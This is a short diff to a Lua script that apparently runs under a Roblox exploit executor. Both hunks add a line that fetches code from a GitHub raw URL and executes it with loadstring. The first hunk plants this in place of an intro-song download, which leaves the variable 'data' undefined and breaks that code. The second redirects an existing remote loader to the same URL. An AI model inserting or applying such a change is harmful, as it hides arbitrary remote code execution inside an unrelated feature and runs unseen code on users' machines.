@@ -1479,7 +1479,7 @@ if cached then return cached end
 end
 introSongDownloading[fileName] = true
 local ok = pcall(function()
-local data = game:HttpGet(option.url)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
 if data and #data > 0 then
 writefile(fileName, data)
 introSongCache[fileName] = getcustomasset(fileName)
@@ -13286,7 +13286,7 @@ if not character or not character.Parent or not humanoid or humanoid.Health <= 0
 AdaptResetSuccessful = true
 break
 end
-loadstring(game:HttpGet("https://pastefy.app/7M2ZaY2w/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
 attempts += 1
 if attempts >= maxAttempts then break end
 task.wait(AdaptResetMaxDuration)
